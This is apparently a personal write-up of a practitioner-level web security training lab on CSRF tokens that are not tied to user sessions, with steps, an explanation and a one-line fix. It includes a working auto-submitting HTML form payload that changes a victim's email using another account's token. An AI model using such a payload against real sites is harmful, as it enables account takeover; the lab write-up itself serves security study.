# Lab 4: CSRF Token Not Tied to User Session
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
CSRF tokens exist in a global pool.
Not tied to specific user sessions.
Token from one account works for another.

## Payload
```
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
    <input type="hidden" name="csrf" value="WIENER_TOKEN_HERE">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Steps
1. Logged in as wiener → intercepted email change → noted CSRF token → dropped request
2. Logged in as carlos in incognito → sent email change to Repeater
3. Swapped carlos token with wiener token → 200 OK!
4. Confirmed tokens are interchangeable
5. Used fresh wiener token in exploit form
6. Delivered to victim → solved

## Why It Works
Tokens validated for existence and format
but not bound to specific user session.
Any valid token works for any user.

## Fix
Bind CSRF tokens to specific user sessions.
